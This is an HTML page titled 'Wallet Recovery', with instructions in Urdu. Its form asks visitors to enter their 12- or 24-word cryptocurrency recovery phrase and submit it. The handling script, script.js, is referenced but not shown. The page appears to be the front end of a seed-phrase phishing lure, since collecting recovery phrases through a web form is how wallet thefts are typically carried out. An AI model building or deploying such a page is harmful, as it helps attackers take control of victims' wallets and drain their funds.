<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Recovery</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

    <div class="container">

        <h1>Wallet Recovery</h1>

        <p>اپنا والیٹ ریکور کرنے کے لیے نیچے معلومات درج کریں۔</p>

        <form>

            <label for="phrase">Recovery Phrase:</label><br>

            <textarea
                id="phrase"
                name="phrase"
                rows="5"
                cols="50"
                placeholder="اپنے 12 یا 24 الفاظ درج کریں"
            ></textarea>

            <br><br>

            <button type="submit">Recover Wallet</button>

        </form>

    </div>

    <script src="script.js"></script>

</body>
</html>
